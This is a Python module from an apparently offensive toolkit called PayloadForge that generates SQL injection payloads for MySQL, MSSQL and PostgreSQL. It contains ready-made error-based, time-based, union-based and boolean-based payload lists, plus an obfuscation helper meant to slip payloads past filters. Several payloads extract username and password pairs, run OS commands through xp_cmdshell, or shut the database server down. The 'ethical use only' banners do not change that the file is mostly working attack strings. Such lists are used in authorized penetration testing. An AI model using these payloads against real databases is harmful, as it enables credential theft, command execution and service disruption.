"""
PayloadForge SQL Injection Payload Generator

⚠️  ETHICAL USE ONLY ⚠️

This module generates SQL Injection payloads for authorized security testing
and educational purposes only. Never use these payloads against systems
without explicit written permission.

Database Support:
- MySQL
- MSSQL
- PostgreSQL

Payload Types:
- Error-based injection
- Time-based blind injection
- Union-based injection
- Boolean-based blind injection

NO REAL DATABASE INTERACTION - GENERATION ONLY
"""

from typing import List, Optional, Dict
from payloadforge.logger import logger


class SQLiGenerator:
    """
    SQL Injection Payload Generator for ethical security testing.
    
    ⚠️ FOR AUTHORIZED TESTING ONLY ⚠️
    """
    
    # Error-based payloads by database type
    ERROR_BASED: Dict[str, List[str]] = {
        "mysql": [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "' OR 1=1--",
            "' OR 1=1#",
            "admin'--",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
        ],
        "mssql": [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "'; EXEC xp_cmdshell('whoami')--",
            "' UNION SELECT NULL,@@version--",
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND 1=1--",
            "') OR ('1'='1'--",
            "1; SELECT * FROM users--",
            "'; SHUTDOWN--",
        ],
        "postgres": [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "'; SELECT version()--",
            "' UNION SELECT NULL,version()--",
            "' AND 1=CAST((SELECT version()) AS int)--",
            "'; SELECT pg_sleep(5)--",
            "' AND 1=1--",
            "') OR ('1'='1'--",
            "1; SELECT * FROM pg_database--",
            "' UNION SELECT NULL,current_user--",
        ],
    }
    
    # Time-based blind payloads
    TIME_BASED: Dict[str, List[str]] = {
        "mysql": [
            "' AND SLEEP(5)--",
            "' AND SLEEP(5)#",
            "' OR SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND IF(1=1,SLEEP(5),0)--",
            "' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)--",
            "' AND BENCHMARK(10000000,SHA1('test'))--",
            "'; SELECT SLEEP(5)--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "' UNION SELECT SLEEP(5)--",
        ],
        "mssql": [
            "'; WAITFOR DELAY '0:0:5'--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND 1=1; WAITFOR DELAY '0:0:5'--",
            "'); WAITFOR DELAY '0:0:5'--",
            "'; IF(1=1) WAITFOR DELAY '0:0:5'--",
            "'; IF(SUBSTRING(@@version,1,1)='M') WAITFOR DELAY '0:0:5'--",
            "1; WAITFOR DELAY '0:0:5'--",
            "' OR 1=1; WAITFOR DELAY '0:0:5'--",
            "'; WAITFOR TIME '00:00:05'--",
            "1'; WAITFOR DELAY '0:0:5'--",
        ],
        "postgres": [
            "'; SELECT pg_sleep(5)--",
            "' AND pg_sleep(5)--",
            "' OR pg_sleep(5)--",
            "'); SELECT pg_sleep(5)--",
            "' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
            "' AND 1=(CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)--",
            "1; SELECT pg_sleep(5)--",
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END--",
            "' UNION SELECT pg_sleep(5)--",
            "' AND pg_sleep(5) IS NOT NULL--",
        ],
    }
    
    # Union-based payloads
    UNION_BASED: Dict[str, List[str]] = {
        "mysql": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,@@version,3--",
            "' UNION SELECT 1,database(),3--",
            "' UNION SELECT 1,user(),3--",
            "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
            "' UNION SELECT 1,column_name,3 FROM information_schema.columns--",
            "' UNION SELECT 1,CONCAT(username,':',password),3 FROM users--",
        ],
        "mssql": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,@@version,3--",
            "' UNION SELECT 1,db_name(),3--",
            "' UNION SELECT 1,user_name(),3--",
            "' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--",
            "' UNION SELECT 1,name,3 FROM syscolumns--",
            "' UNION SELECT 1,username+':'+password,3 FROM users--",
        ],
        "postgres": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,version(),3--",
            "' UNION SELECT 1,current_database(),3--",
            "' UNION SELECT 1,current_user,3--",
            "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
            "' UNION SELECT 1,column_name,3 FROM information_schema.columns--",
            "' UNION SELECT 1,username||':'||password,3 FROM users--",
        ],
    }
    
    # Boolean-based blind payloads
    BOOLEAN_BASED: Dict[str, List[str]] = {
        "mysql": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a'--",
            "' AND 'a'='b'--",
            "' AND SUBSTRING(@@version,1,1)='5'--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND (SELECT LENGTH(database()))>5--",
            "' AND ASCII(SUBSTRING(database(),1,1))>100--",
            "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
            "' AND EXISTS(SELECT * FROM users)--",
        ],
        "mssql": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a'--",
            "' AND 'a'='b'--",
            "' AND SUBSTRING(@@version,1,1)='M'--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND LEN(db_name())>5--",
            "' AND ASCII(SUBSTRING(db_name(),1,1))>100--",
            "' AND (SELECT TOP 1 SUBSTRING(username,1,1) FROM users)='a'--",
            "' AND EXISTS(SELECT * FROM users)--",
        ],
        "postgres": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a'--",
            "' AND 'a'='b'--",
            "' AND SUBSTRING(version(),1,1)='P'--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND LENGTH(current_database())>5--",
            "' AND ASCII(SUBSTRING(current_database(),1,1))>100--",
            "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
            "' AND EXISTS(SELECT * FROM users)--",
        ],
    }
    
    @classmethod
    def generate_error_based(
        cls, db_type: str = "mysql", count: Optional[int] = None
    ) -> List[str]:
        """
        Generate error-based SQL injection payloads.
        
        Args:
            db_type: Database type ('mysql', 'mssql', 'postgres').
            count: Number of payloads to return. If None, returns all.
            
        Returns:
            List of SQL injection payload strings.
        """
        logger.log_sqli(db_type, "error")
        db_type = db_type.lower()
        if db_type not in cls.ERROR_BASED:
            db_type = "mysql"
        
        payloads = cls.ERROR_BASED[db_type]
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_time_based(
        cls, db_type: str = "mysql", count: Optional[int] = None
    ) -> List[str]:
        """
        Generate time-based blind SQL injection payloads.
        
        Args:
            db_type: Database type ('mysql', 'mssql', 'postgres').
            count: Number of payloads to return. If None, returns all.
            
        Returns:
            List of time-based SQL injection payload strings.
        """
        logger.log_sqli(db_type, "time_based")
        db_type = db_type.lower()
        if db_type not in cls.TIME_BASED:
            db_type = "mysql"
        
        payloads = cls.TIME_BASED[db_type]
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_union_based(
        cls, db_type: str = "mysql", count: Optional[int] = None
    ) -> List[str]:
        """
        Generate union-based SQL injection payloads.
        
        Args:
            db_type: Database type ('mysql', 'mssql', 'postgres').
            count: Number of payloads to return. If None, returns all.
            
        Returns:
            List of union-based SQL injection payload strings.
        """
        logger.log_sqli(db_type, "union")
        db_type = db_type.lower()
        if db_type not in cls.UNION_BASED:
            db_type = "mysql"
        
        payloads = cls.UNION_BASED[db_type]
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_boolean_based(
        cls, db_type: str = "mysql", count: Optional[int] = None
    ) -> List[str]:
        """
        Generate boolean-based blind SQL injection payloads.
        
        Args:
            db_type: Database type ('mysql', 'mssql', 'postgres').
            count: Number of payloads to return. If None, returns all.
            
        Returns:
            List of boolean-based SQL injection payload strings.
        """
        logger.log_sqli(db_type, "boolean")
        db_type = db_type.lower()
        if db_type not in cls.BOOLEAN_BASED:
            db_type = "mysql"
        
        payloads = cls.BOOLEAN_BASED[db_type]
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_all(cls, db_type: str = "mysql") -> dict:
        """
        Generate all SQL injection payloads for a specific database type.
        
        Args:
            db_type: Database type ('mysql', 'mssql', 'postgres').
            
        Returns:
            Dictionary with payload categories as keys.
        """
        return {
            "error_based": cls.generate_error_based(db_type),
            "time_based": cls.generate_time_based(db_type),
            "union_based": cls.generate_union_based(db_type),
            "boolean_based": cls.generate_boolean_based(db_type),
        }
    
    @classmethod
    def obfuscate(cls, payloads: List[str], method: str = "case") -> List[str]:
        """
        Obfuscate SQL injection payloads.
        
        Args:
            payloads: List of payloads to obfuscate.
            method: Obfuscation method ('case', 'whitespace', 'comment').
            
        Returns:
            List of obfuscated payloads.
        """
        from payloadforge.utils.obfuscation import SQLObfuscator
        
        obfuscated = []
        for payload in payloads:
            if method == "case":
                obfuscated.append(SQLObfuscator.case_flip(payload))
            elif method == "whitespace":
                obfuscated.append(SQLObfuscator.whitespace_bypass(payload))
            elif method == "comment":
                obfuscated.append(SQLObfuscator.inline_comments(payload))
            else:
                obfuscated.append(payload)
        
        return obfuscated


# Convenience functions
def generate_error_based(db_type: str = "mysql", count: Optional[int] = None) -> List[str]:
    """Generate error-based SQL injection payloads."""
    return SQLiGenerator.generate_error_based(db_type, count)


def generate_time_based(db_type: str = "mysql", count: Optional[int] = None) -> List[str]:
    """Generate time-based blind SQL injection payloads."""
    return SQLiGenerator.generate_time_based(db_type, count)


def generate_union_based(db_type: str = "mysql", count: Optional[int] = None) -> List[str]:
    """Generate union-based SQL injection payloads."""
    return SQLiGenerator.generate_union_based(db_type, count)


def generate_boolean_based(db_type: str = "mysql", count: Optional[int] = None) -> List[str]:
    """Generate boolean-based blind SQL injection payloads."""
    return SQLiGenerator.generate_boolean_based(db_type, count)


def generate_all(db_type: str = "mysql") -> dict:
    """Generate all SQL injection payloads for a database type."""
    return SQLiGenerator.generate_all(db_type)
